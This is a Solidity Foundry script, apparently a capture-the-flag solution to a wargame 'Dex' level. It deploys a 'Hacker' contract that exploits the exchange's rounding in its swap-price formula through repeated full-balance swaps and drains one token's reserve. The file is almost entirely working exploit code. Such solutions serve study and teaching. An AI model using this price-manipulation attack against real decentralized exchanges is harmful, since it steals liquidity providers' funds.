// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Dex, SwappableToken, IERC20} from "../src/DEX.sol";

contract Hacker {
    Dex code;
    IERC20 ETH;
    IERC20 DAI;

    constructor(Dex _code) {
        code = _code;
        ETH = IERC20(code.token1());
        DAI = IERC20(code.token2());
    }

    function attack() external {
        ETH.transferFrom(msg.sender, address(this), 10);
        DAI.transferFrom(msg.sender, address(this), 10);

        ETH.approve(address(code), type(uint256).max);
        DAI.approve(address(code), type(uint256).max);

        _swap(ETH, DAI);
        _swap(DAI, ETH);
        _swap(ETH, DAI);
        _swap(DAI, ETH);
        _swap(ETH, DAI);

        code.swap(address(DAI), address(ETH), 45);

        require(ETH.balanceOf(address(code)) == 0);
    }

    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
        code.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this)));
    }
}

contract DEXSolution is Script {
    Dex public code = Dex(0x42f39Df0C761D4CF8Ee3bfbc134390BBC61048cF);

    function run() external {
        IERC20 ETH = IERC20(code.token1());
        IERC20 DAI = IERC20(code.token2());

        vm.startBroadcast(vm.envUint("PRIV"));
        Hacker hacker = new Hacker(code);
        ETH.approve(address(hacker), 10);
        DAI.approve(address(hacker), 10);
        hacker.attack();
        vm.stopBroadcast();
    }
}
